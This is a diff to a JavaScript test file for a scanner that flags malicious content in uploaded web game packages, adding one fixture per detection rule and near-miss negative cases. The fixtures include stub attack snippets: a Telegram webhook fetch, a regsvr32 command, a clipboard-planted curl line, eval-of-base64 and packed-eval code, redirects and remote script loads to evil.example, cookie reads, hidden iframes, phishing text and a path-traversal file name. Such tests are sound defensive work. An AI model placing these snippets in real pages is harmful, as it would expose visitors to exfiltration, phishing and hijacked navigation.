@@ -2,7 +2,8 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { createRequire } from 'node:module';
-const { scan } = createRequire(import.meta.url)('../lab/scan.js');
+import { readFileSync } from 'node:fs';
+const { scan, LIMITS } = createRequire(import.meta.url)('../lab/scan.js');
 
 const enc = s => new TextEncoder().encode(s);
 const pkg = obj => new Map(Object.entries(obj).map(([k, v]) => [k, typeof v === 'string' ? enc(v) : v]));
@@ -115,4 +116,94 @@ test('obfuscated code is flagged medium', () => {
 test('entry picks the shallowest index.html', () => {
   const r = scan(pkg({ 'a/b/index.html': CANVAS_GAME, 'index.html': CANVAS_GAME }));
   assert.equal(r.entry, 'index.html');
+});
+
+// ---- one fixture per rule id -------------------------------------------------
+// Each row is [rule id, package]. The package must make scan.js raise that id.
+// Text rules get a snippet appended to a working canvas game; markup rules are
+// in index.html because they only run on html/svg files.
+const withSnippet = snippet => pkg({ 'index.html': CANVAS_GAME + snippet });
+const fake = length => ({ length }); // stands in for a big file without allocating it
+const MB = 1024 * 1024;
+
+const RULE_FIXTURES = [
+  // size and path
+  ['too-many-files', new Map(Array.from({ length: LIMITS.files + 1 }, (_, i) => [`f${i}.txt`, enc('x')]))],
+  ['too-big', pkg({ 'a.bin': fake(80 * MB), 'b.bin': fake(80 * MB), 'c.bin': fake(80 * MB), 'd.bin': fake(80 * MB) })],
+  ['file-too-big', pkg({ 'index.html': CANVAS_GAME, 'big.bin': fake(LIMITS.fileBytes + 1) })],
+  ['bad-path', pkg({ 'index.html': CANVAS_GAME, '../evil.js': 'x' })],
+  // file types
+  ['program-file', pkg({ 'index.html': CANVAS_GAME, 'tool.exe': 'x' })],
+  ['review-file', pkg({ 'index.html': CANVAS_GAME, 'server.php': '<?php echo 1;' })],
+  ['disguised', pkg({ 'index.html': CANVAS_GAME, 'hero.png': new Uint8Array([0x4d, 0x5a, 0x90, 0]) })],
+  ['unknown-types', pkg({ 'index.html': CANVAS_GAME, 'notes.xyz1': 'x' })],
+  // text rules
+  ['miner', withSnippet('<script>var pool = "stratum+tcp://pool.example:3333";</script>')],
+  ['webhook-exfil', withSnippet('<script>fetch("https://api.telegram.org/bot1/sendMessage");</script>')],
+  ['shell-command', withSnippet('<script>var c = "regsvr32 /s evil.dll";</script>')],
+  ['clipboard-command', withSnippet('<script>navigator.clipboard.writeText("curl http://x/y");</script>')],
+  ['extension-install', withSnippet('<script>chrome.webstore.install();</script>')],
+  ['eval-decode', withSnippet('<script>eval(atob("YWxlcnQoMSk="));</script>')],
+  ['doc-write-unescape', withSnippet('<script>document.write(unescape("%3Cp%3E"));</script>')],
+  ['packed-eval', withSnippet('<script>eval(function(p,a,c,k,e,d){return p});</script>')],
+  ['obfuscated', withSnippet('<script>' + Array.from({ length: 60 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}()`).join(';') + '</script>')],
+  ['redirect', withSnippet('<script>location.href = "https://evil.example/x";</script>')],
+  ['meta-refresh', withSnippet('<meta http-equiv="refresh" content="0;url=https://evil.example">')],
+  ['top-nav', withSnippet('<script>parent.location = "https://evil.example";</script>')],
+  ['top-access', withSnippet('<script>window.parent.document.title = "x";</script>')],
+  ['password-field', withSnippet('<input type="password" name="p">')],
+  ['phish-text', withSnippet('<p>Enter your password to continue.</p>')],
+  ['scare-text', withSnippet('<p>Your computer has been infected.</p>')],
+  ['download-exe', withSnippet('<script>var url = "setup.exe";</script>')],
+  ['clipboard-read', withSnippet('<script>navigator.clipboard.readText();</script>')],
+  ['cookie-read', withSnippet('<script>var c = document.cookie;</script>')],
+  ['beacon', withSnippet('<script>navigator.sendBeacon("/log", "x");</script>')],
+  ['websocket', withSnippet('<script>new WebSocket("wss://example.com/ws");</script>')],
+  ['hidden-iframe', withSnippet('<iframe src="about:blank" width="0" height="0"></iframe>')],
+  ['hidden-iframe-js', withSnippet("<script>var f = document.createElement('iframe'); f.style.display='none';</script>")],
+  ['external-iframe', withSnippet('<iframe src="https://example.org/page"></iframe>')],
+  ['meta-csp-strip', withSnippet('<meta http-equiv="Content-Security-Policy" content="default-src *">')],
+  ['device-access', withSnippet('<script>navigator.geolocation.getCurrentPosition(() => {});</script>')],
+  ['service-worker', withSnippet('<script>navigator.serviceWorker.register("/sw.js");</script>')],
+  ['remote-code', withSnippet('<script>importScripts("https://evil.example/x.js");</script>')],
+  ['tab-trap', withSnippet('<script>window.onbeforeunload = () => "stay";</script>')],
+  ['popup', withSnippet('<script>window.open("https://example.org");</script>')],
+  ['fingerprint', withSnippet('<script>navigator.getBattery();</script>')],
+  ['download-trigger', withSnippet('<script>var a = document.createElement("a"); a.download = "x.txt";</script>')],
+  // host check
+  ['external-hosts', pkg({ 'index.html': CANVAS_GAME + '<img src="https://tracker.example.net/p.gif">' })],
+];
+
+for (const [id, files] of RULE_FIXTURES) {
+  test(`rule ${id} fires on its fixture`, () => {
+    const r = scan(files);
+    assert.ok(ids(r).includes(id), `expected ${id}, got ${JSON.stringify(ids(r))}`);
+  });
+}
+
+test('every rule id in scan.js has a fixture', () => {
+  const src = readFileSync(new URL('../lab/scan.js', import.meta.url), 'utf8');
+  const declared = new Set([...src.matchAll(/\{ id: '([a-z-]+)'/g), ...src.matchAll(/add\('([a-z-]+)'/g)].map(m => m[1]));
+  const covered = new Set(RULE_FIXTURES.map(([id]) => id));
+  assert.deepEqual([...declared].filter(id => !covered.has(id)), []);
+  assert.deepEqual([...covered].filter(id => !declared.has(id)), []);
+});
+
+// ---- negative cases: near-misses that must not raise a finding at each tier ----
+const NEAR_MISS = {
+  critical: '<script>// Built with PowerShell scripts and the cmd prompt. No shell runs here.</script>',
+  high: '<script>const loc = window.location.search; // a high-score table, not a redirect</script>',
+  medium: '<script>const docCookie = 1; const parentNode = 2; // top scores</script>',
+  low: '<script>const memory = 1; const menu = 2;</script>',
+};
+
+for (const [tier, snippet] of Object.entries(NEAR_MISS)) {
+  test(`no ${tier} finding for a near-miss`, () => {
+    const r = scan(withSnippet(snippet));
+    assert.deepEqual(r.findings.filter(f => f.sev === tier), [], JSON.stringify(r.findings));
+  });
+}
+
+test('clean game raises no findings', () => {
+  assert.deepEqual(scan(pkg({ 'index.html': CANVAS_GAME })).findings, []);
 });
